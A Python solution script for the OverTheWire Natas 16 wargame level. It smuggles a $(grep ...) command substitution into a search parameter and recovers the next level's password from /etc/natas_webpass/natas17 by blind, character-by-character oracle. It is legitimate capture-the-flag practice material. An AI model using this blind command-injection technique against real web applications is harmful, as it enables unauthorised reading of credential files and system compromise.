import requests
from check_auth_create_session import BasicAuthentication
from termcolor import colored

alphanumeric = ('0123456789' + 'abcdefghijklmnopqrstuvwxyz' + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ')

target = "http://natas16.natas.labs.overthewire.org"

print(colored("[i] ", "blue") + "Checking for Basic Authentication")
basic_auth = BasicAuthentication()
if basic_auth.check_basic_auth(target):
    print("Uses Basic Auth")
    username = input("Enter username: ")
    password = input("Enter password: ")
    s = basic_auth.createAuthSession(username, password)
else:
    s = requests.Session()

password = ""
more_characters = True

while more_characters:
    found = False
    for char in alphanumeric:
        data = {"submit":"Search", "needle":f"$(grep ^{password + char} /etc/natas_webpass/natas17)Africans"}
        response = s.get(target, params=data)
        
        if response.ok:
            if not "Africans" in response.text:
                found = True
                password += char
                print(colored("[$] ", "green") + f"Matched character: {char}")
                break
                
    if not found:
        more_characters = False

print(colored("[$] ", "green") + f"Extrated Password: {password}")